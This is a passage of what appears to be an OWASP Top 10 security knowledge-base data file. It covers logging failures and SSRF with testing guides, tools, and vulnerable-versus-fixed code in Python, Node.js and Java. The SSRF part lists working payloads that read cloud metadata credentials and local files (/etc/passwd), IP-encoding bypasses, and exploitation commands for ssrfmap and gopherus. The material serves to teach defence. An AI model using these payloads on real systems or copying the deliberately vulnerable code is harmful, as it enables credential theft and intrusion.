    @NotNull
    @Pattern(regexp = "^[0-9]{10}$")
    private String toAccount;

    @NotNull
    @DecimalMin("0.01")
    @DecimalMax("1000000.00")
    private BigDecimal amount;

    // getters and setters
}

// If Java serialization is absolutely required, use allowlisting
public class SafeObjectInputStream extends ObjectInputStream {
    private static final Set<String> ALLOWED_CLASSES = Set.of(
        "com.example.model.TransferRequest",
        "java.lang.String",
        "java.math.BigDecimal"
    );

    @Override
    protected Class<?> resolveClass(ObjectStreamClass desc)
            throws IOException, ClassNotFoundException {
        if (!ALLOWED_CLASSES.contains(desc.getName())) {
            throw new InvalidClassException("Unauthorized class: " + desc.getName());
        }
        return super.resolveClass(desc);
    }
}`,
      },
    ],

    references: [
      'https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/',
      'https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html',
      'https://cheatsheetseries.owasp.org/cheatsheets/Third_Party_Javascript_Management_Cheat_Sheet.html',
      'https://slsa.dev/ (Supply chain Levels for Software Artifacts)',
      'https://www.sigstore.dev/ (Sigstore -- signing, verification, provenance)',
      'https://in-toto.io/ (in-toto -- supply chain security framework)',
      'Case Study: SolarWinds SUNBURST (2020) -- build system compromised, affected 18,000 organizations',
      'Case Study: Codecov supply chain attack (2021) -- compromised bash uploader for 2+ months',
      'Case Study: ua-parser-js npm compromise (2021) -- popular package injected with cryptominer',
      'Case Study: event-stream (2018) -- maintainer transferred to attacker who added malicious code',
    ],
  },

  // =========================================================================
  // A09:2021 - Security Logging and Monitoring Failures
  // =========================================================================
  {
    id: 'A09',
    name: 'Security Logging and Monitoring Failures',
    description:
      'This category helps detect, escalate, and respond to active breaches. Without logging ' +
      'and monitoring, breaches cannot be detected. Insufficient logging, detection, monitoring, ' +
      'and active response occurs any time: auditable events such as logins, failed logins, and ' +
      'high-value transactions are not logged; warnings and errors generate no, inadequate, or ' +
      'unclear log messages; logs are not monitored for suspicious activity; logs are only stored ' +
      'locally; appropriate alerting thresholds and response escalation processes are not in ' +
      'place. This category was previously titled "Insufficient Logging and Monitoring."',

    impact:
      'Without effective logging and monitoring, attackers can maintain persistence in systems ' +
      'for extended periods. The average time to detect a breach is 197 days (IBM Cost of a Data ' +
      'Breach Report). Lack of logging makes incident response and forensic analysis significantly ' +
      'harder or impossible. Regulatory frameworks (PCI-DSS, HIPAA, SOX, GDPR) require adequate ' +
      'logging and monitoring; failure to comply can result in substantial fines. Without proper ' +
      'alerting, even detected anomalies may not trigger timely response.',

    examples: [
      'Login attempts (successful and failed) not logged',
      'Authentication failures not monitored or alerted on',
      'High-value transactions not logged with sufficient detail',
      'Log messages that do not include necessary context (who, what, when, where)',
      'Logs stored only on the application server (lost if compromised)',
      'No centralized log management or aggregation',
      'Missing alerting for suspicious patterns (brute force, privilege escalation)',
      'Log injection vulnerabilities allowing attackers to forge entries',
      'Sensitive data (passwords, tokens, PII) logged in plaintext',
      'Insufficient log retention (too short for forensic investigation)',
      'No integrity protection for log files (attackers can tamper with logs)',
      'Missing audit trail for administrative actions',
      'API calls not logged or monitored',
      'Error logs not monitored for security-relevant exceptions',
      'No real-time alerting for critical security events',
      'Missing correlation of events across systems',
      'No baseline established for normal system behavior',
      'Penetration testing and security scans do not trigger alerts',
      'Log format inconsistencies making automated analysis difficult',
      'Missing logs for data access and modification events',
    ],

    testingGuide: [
      '1. Trigger a login failure and verify it is logged with IP, timestamp, and username',
      '2. Trigger multiple failed logins and verify an alert is generated',
      '3. Perform a successful login and verify it is logged',
      '4. Access a sensitive resource and verify the access is logged',
      '5. Attempt an unauthorized action and verify it is logged and alerted',
      '6. Check that logs include: timestamp, source IP, user ID, action, resource, result',
      '7. Verify that sensitive data (passwords, tokens, credit cards) is NOT in logs',
      '8. Test log injection: submit input containing newlines and log format characters',
      '9. Verify that logs are sent to a centralized logging system (not just local files)',
      '10. Check log retention policies meet regulatory requirements (typically 90 days to 1 year)',
      '11. Verify that log files have appropriate permissions (read-only after write)',
      '12. Test that administrative actions are logged with actor identification',
      '13. Verify that log integrity is protected (checksums, write-once storage)',
      '14. Check for real-time monitoring dashboards and alerts',
      '15. Test that security alerts are triggered by: brute force, privilege escalation, unusual access patterns',
      '16. Verify that response procedures exist and are tested for each alert type',
      '17. Check that logs include sufficient context for incident investigation',
      '18. Test that API endpoint calls are logged with request/response metadata',
      '19. Verify log format consistency across all application components',
      '20. Test that backup and restore of logs works correctly',
      '21. Verify that clock synchronization (NTP) is configured for accurate timestamps',
      '22. Check that debug logging is disabled in production',
    ],

    tools: [
      'ELK Stack: Elasticsearch, Logstash, Kibana for log management and visualization',
      'Splunk: splunk search "index=security sourcetype=auth failed" (SIEM)',
      'Graylog: centralized log management with alerting',
      'AWS CloudWatch: aws cloudwatch describe-alarms (cloud-native monitoring)',
      'AWS CloudTrail: aws cloudtrail lookup-events (API activity logging)',
      'Datadog: real-time monitoring, log management, and security analytics',
      'Prometheus + Grafana: metrics collection and visualization with alerting',
      'OSSEC/Wazuh: host-based intrusion detection and log analysis',
      'Suricata: network IDS/IPS with logging capabilities',
      'Fail2ban: fail2ban-client status sshd (automated response to log patterns)',
      'auditd: auditctl -l (Linux audit framework)',
      'syslog-ng / rsyslog: centralized syslog collection',
      'Fluentd / Fluent Bit: log collection and forwarding agents',
      'MITRE ATT&CK framework: for mapping detection coverage to attack techniques',
      'Sigma rules: generic detection rules for SIEM systems',
      'Panther: cloud-native SIEM with detection-as-code',
      'Falco: runtime security monitoring for containers and Kubernetes',
    ],

    remediation: [
      'Log all authentication events: logins, failures, logouts, MFA events',
      'Log all access control failures and denied requests',
      'Log all input validation failures and suspicious input patterns',
      'Log high-value transactions with full context (user, action, resource, timestamp)',
      'Use a structured logging format (JSON) for machine parseability',
      'Include context in every log entry: timestamp (UTC), source IP, user ID, action, resource, outcome',
      'Never log sensitive data: passwords, tokens, session IDs, PII, credit card numbers',
      'Sanitize log input to prevent log injection (encode newlines, control characters)',
      'Send logs to a centralized logging system (SIEM) in real-time',
      'Implement log integrity protection: write-once storage, checksums, digital signatures',
      'Set up alerting rules for security events with defined thresholds',
      'Establish incident response procedures for each alert category',
      'Implement log retention policies that meet regulatory requirements',
      'Use NTP synchronization for accurate timestamps across all systems',
      'Regularly review and tune alerting rules to reduce false positives',
      'Establish baselines for normal behavior to detect anomalies',
      'Implement runtime application self-protection (RASP) for automated response',
      'Conduct regular log review exercises and incident response drills',
    ],

    codeExamples: [
      {
        title: 'Vulnerable: Missing Security Logging in Python Flask',
        language: 'python',
        vulnerable: `
@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']
    user = authenticate(username, password)
    if user:
        session['user_id'] = user.id
        return redirect('/dashboard')
    # No logging of failed attempt
    return 'Invalid credentials', 401

@app.route('/admin/delete-user/<int:user_id>', methods=['DELETE'])
def delete_user(user_id):
    # No audit logging of administrative action
    User.query.filter_by(id=user_id).delete()
    db.session.commit()
    return jsonify({'status': 'deleted'})

@app.route('/api/transfer', methods=['POST'])
def transfer():
    amount = request.json['amount']
    # No logging of financial transaction
    process_transfer(current_user, amount)
    return jsonify({'status': 'success'})`,
        fixed: `
import logging
import json
from datetime import datetime, timezone

# Structured security logger
security_logger = logging.getLogger('security')
security_logger.setLevel(logging.INFO)

# JSON formatter for structured logging
class SecurityFormatter(logging.Formatter):
    def format(self, record):
        log_entry = {
            'timestamp': datetime.now(timezone.utc).isoformat(),
            'level': record.levelname,
            'event': record.msg,
            'logger': record.name,
        }
        if hasattr(record, 'extra_data'):
            log_entry.update(record.extra_data)
        return json.dumps(log_entry)

handler = logging.StreamHandler()
handler.setFormatter(SecurityFormatter())
security_logger.addHandler(handler)

def log_security_event(event, **kwargs):
    """Log a security event with structured context."""
    # Sanitize log data to prevent log injection
    sanitized = {}
    for key, value in kwargs.items():
        if isinstance(value, str):
            sanitized[key] = value.replace('\\n', '\\\\n').replace('\\r', '\\\\r')
        else:
            sanitized[key] = value
    record = security_logger.makeRecord(
        'security', logging.INFO, '', 0, event, (), None)
    record.extra_data = sanitized
    security_logger.handle(record)

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username', '')
    password = request.form.get('password', '')
    user = authenticate(username, password)

    if user:
        session['user_id'] = user.id
        log_security_event('authentication_success', **{
            'user_id': user.id,
            'username': username,
            'source_ip': request.remote_addr,
            'user_agent': request.user_agent.string,
        })
        return redirect('/dashboard')

    log_security_event('authentication_failure', **{
        'username': username,
        'source_ip': request.remote_addr,
        'user_agent': request.user_agent.string,
        'reason': 'invalid_credentials',
    })
    return jsonify({'error': 'Invalid credentials'}), 401

@app.route('/admin/delete-user/<int:user_id>', methods=['DELETE'])
@admin_required
def delete_user(user_id):
    target_user = User.query.get_or_404(user_id)
    log_security_event('admin_user_deletion', **{
        'admin_id': current_user.id,
        'deleted_user_id': user_id,
        'deleted_username': target_user.username,
        'source_ip': request.remote_addr,
    })
    User.query.filter_by(id=user_id).delete()
    db.session.commit()
    return jsonify({'status': 'deleted'})

@app.route('/api/transfer', methods=['POST'])
@login_required
def transfer():
    amount = request.json.get('amount')
    to_account = request.json.get('to_account')

    log_security_event('financial_transaction', **{
        'user_id': current_user.id,
        'action': 'transfer',
        'amount': amount,
        'to_account': to_account,
        'source_ip': request.remote_addr,
    })

    result = process_transfer(current_user, amount, to_account)

    log_security_event('financial_transaction_result', **{
        'user_id': current_user.id,
        'transaction_id': result.id,
        'status': result.status,
        'amount': amount,
    })
    return jsonify({'status': result.status})`,
      },
      {
        title: 'Vulnerable: Logging Sensitive Data in Node.js',
        language: 'javascript',
        vulnerable: `
app.post('/api/login', (req, res) => {
  const { username, password } = req.body;
  // NEVER log passwords
  console.log('Login attempt:', username, password);
  // ...
});

app.post('/api/payment', (req, res) => {
  const { cardNumber, cvv, expiry } = req.body;
  // NEVER log credit card details
  console.log('Payment:', JSON.stringify(req.body));
  // ...
});

// Using console.log instead of proper logging framework
// No structured format, no log levels, no context`,
        fixed: `
const winston = require('winston');

const logger = winston.createLogger({
  level: 'info',
  format: winston.format.combine(
    winston.format.timestamp({ format: 'ISO' }),
    winston.format.json()
  ),
  defaultMeta: { service: 'api' },
  transports: [
    new winston.transports.Console(),
    new winston.transports.File({ filename: 'security.log', level: 'warn' }),
    // Send to centralized logging
    // new WinstonElasticsearch({ ... }),
  ],
});

// Sensitive data masking utility
function maskSensitive(data) {
  const masked = { ...data };
  const sensitiveFields = [
    'password', 'token', 'secret', 'authorization',
    'cardNumber', 'cvv', 'ssn', 'creditCard',
  ];
  for (const field of sensitiveFields) {
    if (masked[field]) {
      masked[field] = '***REDACTED***';
    }
  }
  if (masked.cardNumber) {
    masked.cardNumber = '****' + String(data.cardNumber).slice(-4);
  }
  return masked;
}

app.post('/api/login', (req, res) => {
  const { username, password } = req.body;
  // Log attempt without sensitive data
  logger.info('Login attempt', {
    event: 'authentication_attempt',
    username,
    sourceIp: req.ip,
    userAgent: req.get('user-agent'),
    // password is NOT logged
  });
  // ...
});

app.post('/api/payment', (req, res) => {
  logger.info('Payment initiated', {
    event: 'payment_attempt',
    userId: req.user.id,
    amount: req.body.amount,
    currency: req.body.currency,
    cardLast4: String(req.body.cardNumber).slice(-4),
    sourceIp: req.ip,
    // Full card number, CVV, expiry are NOT logged
  });
  // ...
});`,
      },
      {
        title: 'Vulnerable: No Monitoring/Alerting (Java Spring Boot)',
        language: 'java',
        vulnerable: `
@RestController
public class AuthController {

    @PostMapping("/login")
    public ResponseEntity<?> login(@RequestBody LoginRequest request) {
        // No monitoring, no alerting, no metrics
        try {
            User user = authService.authenticate(
                request.getUsername(), request.getPassword());
            return ResponseEntity.ok(new AuthResponse(generateToken(user)));
        } catch (AuthenticationException e) {
            // Silent failure -- no logging, no alerting
            return ResponseEntity.status(401).body("Invalid credentials");
        }
    }
}`,
        fixed: `
@RestController
@Slf4j
public class AuthController {

    @Autowired
    private MeterRegistry meterRegistry;

    @Autowired
    private SecurityEventPublisher eventPublisher;

    private final Counter loginSuccessCounter;
    private final Counter loginFailureCounter;

    public AuthController(MeterRegistry registry) {
        this.loginSuccessCounter = Counter.builder("auth.login.success")
            .description("Successful login attempts")
            .register(registry);
        this.loginFailureCounter = Counter.builder("auth.login.failure")
            .description("Failed login attempts")
            .register(registry);
    }

    @PostMapping("/login")
    public ResponseEntity<?> login(
            @RequestBody @Valid LoginRequest request,
            HttpServletRequest httpRequest) {
        String clientIp = httpRequest.getRemoteAddr();
        String userAgent = httpRequest.getHeader("User-Agent");

        try {
            User user = authService.authenticate(
                request.getUsername(), request.getPassword());

            // Log successful authentication
            log.info("Authentication successful: user={}, ip={}, userAgent={}",
                request.getUsername(), clientIp, userAgent);

            loginSuccessCounter.increment();

            // Publish security event for SIEM consumption
            eventPublisher.publish(SecurityEvent.builder()
                .type("AUTH_SUCCESS")
                .username(request.getUsername())
                .sourceIp(clientIp)
                .userAgent(userAgent)
                .timestamp(Instant.now())
                .build());

            return ResponseEntity.ok(new AuthResponse(generateToken(user)));

        } catch (AuthenticationException e) {
            // Log failed authentication
            log.warn("Authentication failed: user={}, ip={}, reason={}",
                request.getUsername(), clientIp, e.getMessage());

            loginFailureCounter.increment();

            // Publish failure event -- triggers alerting rules
            eventPublisher.publish(SecurityEvent.builder()
                .type("AUTH_FAILURE")
                .username(request.getUsername())
                .sourceIp(clientIp)
                .userAgent(userAgent)
                .reason(e.getMessage())
                .timestamp(Instant.now())
                .build());

            return ResponseEntity.status(401).body("Invalid credentials");
        }
    }
}

// Alert configuration (Prometheus/Alertmanager)
// - alert: HighLoginFailureRate
//   expr: rate(auth_login_failure_total[5m]) > 10
//   for: 2m
//   labels:
//     severity: warning
//   annotations:
//     summary: "High rate of login failures detected"`,
      },
    ],

    references: [
      'https://owasp.org/Top10/A09_2021-Security_Logging_and_Monitoring_Failures/',
      'https://cheatsheetseries.owasp.org/cheatsheets/Logging_Cheat_Sheet.html',
      'https://cheatsheetseries.owasp.org/cheatsheets/Application_Logging_Vocabulary_Cheat_Sheet.html',
      'https://owasp.org/www-project-proactive-controls/v3/en/c9-security-logging.html',
      'NIST SP 800-92: Guide to Computer Security Log Management',
      'PCI-DSS Requirement 10: Track and monitor all access to network resources and cardholder data',
      'Case Study: Target breach (2013) -- FireEye alerts were generated but not acted upon, 40M cards stolen',
      'Case Study: Marriott breach (2018) -- breach undetected for 4 years, 500M guest records compromised',
      'IBM Cost of a Data Breach Report: average 197 days to identify a breach, 69 days to contain',
    ],
  },

  // =========================================================================
  // A10:2021 - Server-Side Request Forgery (SSRF)
  // =========================================================================
  {
    id: 'A10',
    name: 'Server-Side Request Forgery (SSRF)',
    description:
      'SSRF flaws occur whenever a web application fetches a remote resource without validating ' +
      'the user-supplied URL. It allows an attacker to coerce the application to send a crafted ' +
      'request to an unexpected destination, even when protected by a firewall, VPN, or another ' +
      'type of network access control list. As modern web applications provide end-users with ' +
      'convenient features, fetching a URL becomes a common scenario. As a result, the incidence ' +
      'of SSRF is increasing. Also, the severity of SSRF is becoming higher due to cloud services ' +
      'and the complexity of architectures. This is a new addition to the Top 10 for 2021, ' +
      'driven by the community survey (#1 concern).',

    impact:
      'SSRF can allow attackers to scan and interact with internal services, access cloud ' +
      'instance metadata (AWS, GCP, Azure credentials), read local files via file:// protocol, ' +
      'access internal APIs and databases, bypass firewalls and network ACLs, and achieve remote ' +
      'code execution in some cases. The Capital One breach (2019) demonstrated how SSRF combined ' +
      'with misconfigured cloud IAM roles can lead to massive data exposure. In cloud environments, ' +
      'SSRF can expose temporary credentials via metadata endpoints (169.254.169.254).',

    examples: [
      'URL parameter used to fetch remote content: /api/fetch?url=http://evil.com',
      'Webhook URL validation bypass to access internal services',
      'Image/file import from user-supplied URL without validation',
      'PDF generation with user-controlled URLs (server fetches embedded resources)',
      'Cloud metadata access: http://169.254.169.254/latest/meta-data/ (AWS)',
      'Cloud metadata access: http://metadata.google.internal/computeMetadata/v1/ (GCP)',
      'Cloud metadata access: http://169.254.169.254/metadata/instance (Azure)',
      'Internal port scanning via SSRF: http://internal-host:port/',
      'File protocol abuse: file:///etc/passwd, file:///proc/self/environ',
      'Gopher protocol abuse: gopher://internal:port/ for protocol smuggling',
      'DNS rebinding to bypass SSRF protections',
      'SSRF via SVG image processing (external entity references)',
      'SSRF via XML parsing (XXE with external DTD)',
      'SSRF via redirect following: server follows 301/302 to internal host',
      'SSRF via URL fragments and authentication: http://attacker@internal-host/',
      'Blind SSRF: no response returned but request is made (detectable via timing or OOB)',
      'SSRF via DNS resolution: localhost alternatives (0.0.0.0, 127.0.0.1, [::1], 0177.0.0.1)',
      'SSRF via URL shorteners: redirecting through external services',
      'SSRF in headless browser/screenshot services',
      'SSRF via SMTP/email: fetching content from user-supplied URLs in email templates',
      'SSRF via GraphQL introspection combined with batch queries',
      'Partial SSRF: response not returned but side effects are observable',
      'SSRF via Server-Side Includes (SSI)',
      'SSRF via PDF/document conversion services',
      'SSRF via HTTP request splitting/smuggling',
    ],

    testingGuide: [
      '1. Identify all parameters that accept URLs, hostnames, or IP addresses',
      '2. Test with internal addresses: http://127.0.0.1, http://localhost, http://[::1]',
      '3. Test with cloud metadata endpoints: http://169.254.169.254/latest/meta-data/',
      '4. Test with alternative IP representations: 0x7f000001, 2130706433, 017700000001',
      '5. Test with IPv6 representations: http://[0:0:0:0:0:ffff:127.0.0.1]/',
      '6. Test with DNS rebinding: use a domain that resolves to 127.0.0.1',
      '7. Test with URL redirection: provide URL that redirects to internal host',
      '8. Test with different protocols: file://, gopher://, dict://, ftp://',
      '9. Test with URL encoding: http://%31%32%37%2e%30%2e%30%2e%31/',
      '10. Test with URL fragments: http://evil.com#@internal-host/',
      '11. Test with domain confusion: http://internal-host.evil.com/',
      '12. Test with special characters: http://127.1, http://0, http://0x7f.0.0.1',
      '13. Test blind SSRF with out-of-band (OOB) detection: Burp Collaborator, interactsh',
      '14. Test with port scanning: iterate through common ports on internal hosts',
      '15. Test with AWS IMDSv1 endpoint: http://169.254.169.254/latest/meta-data/iam/security-credentials/',
      '16. Test with DNS lookup: provide URL with domain that has internal IP in DNS record',
      '17. Test partial SSRF: observe response times for accessible vs non-accessible hosts',
      '18. Test via webhooks: register webhook URL pointing to internal service',
      '19. Test via file import: import file from URL pointing to internal resource',
      '20. Test SSRF via SVG: upload SVG with external entity referencing internal URLs',
      '21. Test via headless browser: submit URL that loads internal content',
      '22. Test bypass with URL shorteners (bit.ly, tinyurl)',
      '23. Test bypass with open redirects on trusted domains',
      '24. Test bypass with decimal IP: http://2130706433/ (127.0.0.1 in decimal)',
      '25. Test with octal IP: http://0177.0.0.1/ (127.0.0.1 in octal)',
    ],

    tools: [
      'Burp Collaborator: out-of-band detection for blind SSRF',
      'interactsh: interactsh-client (ProjectDiscovery OOB interaction server)',
      'SSRFmap: ssrfmap -r request.txt -p url -m readfiles (automated SSRF exploitation)',
      'Gopherus: python3 gopherus.py --exploit mysql (generate gopher payloads)',
      'Nuclei: nuclei -u https://target.com -t ssrf/ (SSRF template scanning)',
      'ffuf: ffuf -u "https://target.com/fetch?url=FUZZ" -w ssrf-urls.txt -mc 200',
      'curl: curl "https://target.com/api/fetch?url=http://169.254.169.254/latest/meta-data/"',
      'dnsbin / requestbin: external services for detecting outbound requests',
      'Burp Suite: active scanner detects basic SSRF, extensions for advanced testing',
      'OWASP ZAP: SSRF detection rules in active scanner',
      'tplmap: template injection that can escalate to SSRF',
      'Nmap: nmap -sV -p- internal-host (post-exploitation internal scanning)',
      'AWS CLI: aws sts get-caller-identity (verify stolen metadata credentials)',
      'httpbin: httpbin.org/anything (testing URL fetch behavior)',
      'rebinder: DNS rebinding tool for SSRF bypass testing',
    ],

    remediation: [
      'Sanitize and validate all client-supplied URL input against an allowlist of permitted domains/IPs',
      'Deny access to private IP ranges: 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 127.0.0.0/8, 169.254.0.0/16',
      'Deny access to link-local and loopback addresses in all formats (decimal, hex, octal, IPv6)',
      'Use allowlists for permitted protocols (https only, no file://, gopher://, dict://)',
      'Do not follow HTTP redirects from user-supplied URLs (or validate each redirect target)',
      'Enforce IMDSv2 on AWS EC2 instances (requires session tokens, blocks SSRF)',
      'Implement network segmentation: the web application should not have direct access to internal services',
      'Use a dedicated proxy/gateway for outbound requests with strict URL validation',
      'Resolve DNS and validate the resulting IP before making the request (prevent DNS rebinding)',
      'Implement response validation: do not return raw responses from internal services to users',
      'Disable unnecessary URL schemes in HTTP clients',
      'Apply the principle of least privilege for service IAM roles',
      'Monitor and alert on requests to metadata endpoints and internal addresses',
      'Use firewall rules to restrict outbound traffic from web servers',
      'Implement request timeouts to prevent port scanning via timing',
    ],

    codeExamples: [
      {
        title: 'Vulnerable: SSRF in URL Fetch (Python)',
        language: 'python',
        vulnerable: `
import requests

@app.route('/api/fetch')
def fetch_url():
    url = request.args.get('url')
    # No validation -- fetches any URL including internal resources
    response = requests.get(url)
    return response.text

@app.route('/api/preview')
def preview_url():
    url = request.args.get('url')
    # Follows redirects to internal hosts
    response = requests.get(url, allow_redirects=True)
    return jsonify({
        'title': extract_title(response.text),
        'content': response.text[:1000],
    })

# Attack: /api/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
# Attack: /api/fetch?url=file:///etc/passwd
# Attack: /api/fetch?url=http://internal-db:5432/`,
        fixed: `
import requests
import ipaddress
import socket
from urllib.parse import urlparse

ALLOWED_SCHEMES = {'http', 'https'}
ALLOWED_DOMAINS = {'api.example.com', 'cdn.example.com', 'images.example.com'}

# Private/reserved IP ranges that should be blocked
BLOCKED_NETWORKS = [
    ipaddress.ip_network('10.0.0.0/8'),
    ipaddress.ip_network('172.16.0.0/12'),
    ipaddress.ip_network('192.168.0.0/16'),
    ipaddress.ip_network('127.0.0.0/8'),
    ipaddress.ip_network('169.254.0.0/16'),
    ipaddress.ip_network('0.0.0.0/8'),
    ipaddress.ip_network('100.64.0.0/10'),
    ipaddress.ip_network('198.18.0.0/15'),
    ipaddress.ip_network('::1/128'),
    ipaddress.ip_network('fc00::/7'),
    ipaddress.ip_network('fe80::/10'),
]

def is_safe_url(url):
    """Validate URL is safe to fetch (not internal/private)."""
    try:
        parsed = urlparse(url)
    except Exception:
        return False

    # Check scheme
    if parsed.scheme not in ALLOWED_SCHEMES:
        return False

    # Check domain allowlist (if using allowlist approach)
    hostname = parsed.hostname
    if not hostname:
        return False

    # Option A: Domain allowlist (most restrictive, preferred)
    # if hostname not in ALLOWED_DOMAINS:
    #     return False

    # Option B: Block private IPs (when allowlist is not feasible)
    try:
        # Resolve hostname to IP and check against blocked ranges
        resolved_ips = socket.getaddrinfo(hostname, None)
        for entry in resolved_ips:
            ip = ipaddress.ip_address(entry[4][0])
            for network in BLOCKED_NETWORKS:
                if ip in network:
                    return False
    except (socket.gaierror, ValueError):
        return False

    # Block specific ports
    port = parsed.port or (443 if parsed.scheme == 'https' else 80)
    if port not in {80, 443, 8080, 8443}:
        return False

    return True

@app.route('/api/fetch')
@login_required
def fetch_url():
    url = request.args.get('url', '')

    if not is_safe_url(url):
        return jsonify({'error': 'URL not allowed'}), 400

    try:
        response = requests.get(
            url,
            allow_redirects=False,  # Do not follow redirects
            timeout=5,
            headers={'User-Agent': 'ExampleBot/1.0'},
            stream=True,
        )

        # Limit response size
        content = response.raw.read(1024 * 1024)  # Max 1 MB

        # Validate content type
        content_type = response.headers.get('Content-Type', '')
        allowed_types = ['text/html', 'application/json', 'text/plain']
        if not any(ct in content_type for ct in allowed_types):
            return jsonify({'error': 'Unsupported content type'}), 400

        return content.decode('utf-8', errors='replace')

    except requests.RequestException as e:
        logger.error('URL fetch failed', extra={'url': url, 'error': str(e)})
        return jsonify({'error': 'Failed to fetch URL'}), 500`,
      },
      {
        title: 'Vulnerable: SSRF in Webhook Processing (Node.js)',
        language: 'javascript',
        vulnerable: `
const axios = require('axios');

app.post('/api/webhooks', async (req, res) => {
  const { url, events } = req.body;
  // Stores webhook URL without validation
  await Webhook.create({ url, events, userId: req.user.id });
  res.json({ status: 'Webhook registered' });
});

// When event occurs, sends to all registered webhooks
async function triggerWebhooks(event, data) {
  const webhooks = await Webhook.find({ events: event });
  for (const webhook of webhooks) {
    // Sends request to any URL including internal services
    await axios.post(webhook.url, data);
  }
}

// Also vulnerable: image proxy
app.get('/api/image-proxy', async (req, res) => {
  const imageUrl = req.query.url;
  const response = await axios.get(imageUrl, { responseType: 'stream' });
  response.data.pipe(res);
});`,
        fixed: `
const axios = require('axios');
const { URL } = require('url');
const dns = require('dns').promises;
const net = require('net');

const PRIVATE_RANGES = [
  /^10\\./,
  /^172\\.(1[6-9]|2[0-9]|3[01])\\./,
  /^192\\.168\\./,
  /^127\\./,
  /^169\\.254\\./,
  /^0\\./,
  /^100\\.(6[4-9]|[7-9][0-9]|1[0-2][0-7])\\./,
  /^::1$/,
  /^fc/i,
  /^fe80/i,
];

async function isPrivateIp(hostname) {
  try {
    const addresses = await dns.resolve4(hostname);
    for (const addr of addresses) {
      for (const range of PRIVATE_RANGES) {
        if (range.test(addr)) return true;
      }
    }
    // Also check IPv6
    try {
      const v6addresses = await dns.resolve6(hostname);
      for (const addr of v6addresses) {
        for (const range of PRIVATE_RANGES) {
          if (range.test(addr)) return true;
        }
      }
    } catch (e) {
      // No IPv6 records -- that is fine
    }
    return false;
  } catch (e) {
    return true; // If DNS fails, assume it is unsafe
  }
}

async function validateWebhookUrl(url) {
  try {
    const parsed = new URL(url);

    // Only allow HTTPS
    if (parsed.protocol !== 'https:') {
      return { valid: false, reason: 'Only HTTPS URLs are allowed' };
    }

    // Block private IPs
    if (await isPrivateIp(parsed.hostname)) {
      return { valid: false, reason: 'Private/internal URLs are not allowed' };
    }

    // Block specific ports
    const port = parseInt(parsed.port) || 443;
    if (port !== 443 && port !== 8443) {
      return { valid: false, reason: 'Non-standard ports are not allowed' };
    }

    return { valid: true };
  } catch (e) {
    return { valid: false, reason: 'Invalid URL format' };
  }
}

app.post('/api/webhooks', async (req, res) => {
  const { url, events } = req.body;

  const validation = await validateWebhookUrl(url);
  if (!validation.valid) {
    return res.status(400).json({ error: validation.reason });
  }

  await Webhook.create({ url, events, userId: req.user.id });
  res.json({ status: 'Webhook registered' });
});

async function triggerWebhooks(event, data) {
  const webhooks = await Webhook.find({ events: event });
  for (const webhook of webhooks) {
    // Re-validate URL at send time (DNS rebinding protection)
    const validation = await validateWebhookUrl(webhook.url);
    if (!validation.valid) {
      logger.warn('Webhook URL failed validation at send time', {
        webhookId: webhook.id,
        url: webhook.url,
      });
      continue;
    }

    try {
      await axios.post(webhook.url, data, {
        timeout: 5000,
        maxRedirects: 0, // No redirects
        headers: {
          'X-Webhook-Signature': signPayload(data, webhook.secret),
        },
      });
    } catch (err) {
      logger.error('Webhook delivery failed', {
        webhookId: webhook.id,
        error: err.message,
      });
    }
  }
}

// Safe image proxy with validation
app.get('/api/image-proxy', async (req, res) => {
  const imageUrl = req.query.url;

  const validation = await validateWebhookUrl(imageUrl);
  if (!validation.valid) {
    return res.status(400).json({ error: validation.reason });
  }

  try {
    const response = await axios.get(imageUrl, {
      responseType: 'stream',
      timeout: 10000,
      maxRedirects: 0,
      maxContentLength: 5 * 1024 * 1024, // 5 MB limit
    });

    // Verify content type is an image
    const contentType = response.headers['content-type'] || '';
    if (!contentType.startsWith('image/')) {
      return res.status(400).json({ error: 'URL does not point to an image' });
    }

    res.setHeader('Content-Type', contentType);
    response.data.pipe(res);
  } catch (err) {
    res.status(500).json({ error: 'Failed to fetch image' });
  }
});`,
      },
      {
        title: 'Vulnerable: SSRF in PDF Generation (Java)',
        language: 'java',
        vulnerable: `
@PostMapping("/api/generate-pdf")
public ResponseEntity<byte[]> generatePdf(@RequestBody PdfRequest request) {
    // User controls the HTML content, which may include external URLs
    String html = request.getHtml();
    // The PDF library fetches external resources (images, CSS, fonts)
    // from URLs embedded in the HTML without restriction
    byte[] pdf = pdfGenerator.generateFromHtml(html);
    return ResponseEntity.ok()
        .contentType(MediaType.APPLICATION_PDF)
        .body(pdf);
}

// Attack: include <img src="http://169.254.169.254/latest/meta-data/iam/security-credentials/">
// or <link href="http://internal-service:8080/admin/config">
// or <iframe src="file:///etc/passwd">`,
        fixed: `
@PostMapping("/api/generate-pdf")
public ResponseEntity<byte[]> generatePdf(@RequestBody @Valid PdfRequest request) {
    String html = request.getHtml();

    // Sanitize HTML to remove dangerous elements
    String sanitizedHtml = Jsoup.clean(html,
        Whitelist.relaxed()
            .removeTags("script", "iframe", "object", "embed", "form")
            .removeAttributes(":all", "style")
    );

    // Configure PDF generator with URL restrictions
    PdfGeneratorConfig config = PdfGeneratorConfig.builder()
        .allowExternalResources(false)        // Block external fetches
        .allowFileProtocol(false)             // Block file:// URLs
        .allowedDomains(Set.of(
            "cdn.example.com",
            "static.example.com"
        ))
        .requestTimeout(Duration.ofSeconds(5))
        .maxResourceSize(1024 * 1024)         // 1 MB per resource
        .build();

    byte[] pdf = pdfGenerator.generateFromHtml(sanitizedHtml, config);
    return ResponseEntity.ok()
        .contentType(MediaType.APPLICATION_PDF)
        .body(pdf);
}

// Custom resource fetcher with URL validation
public class SafeResourceFetcher implements ResourceFetcher {
    private final Set<String> allowedDomains;
    private final SsrfValidator validator;

    @Override
    public byte[] fetch(String url) throws IOException {
        // Validate URL against SSRF protections
        if (!validator.isSafeUrl(url)) {
            throw new SecurityException("URL blocked by SSRF protection: " + url);
        }

        // Only fetch from allowlisted domains
        URL parsedUrl = new URL(url);
        if (!allowedDomains.contains(parsedUrl.getHost())) {
            throw new SecurityException("Domain not in allowlist: " + parsedUrl.getHost());
        }

        HttpURLConnection conn = (HttpURLConnection) parsedUrl.openConnection();
        conn.setConnectTimeout(5000);
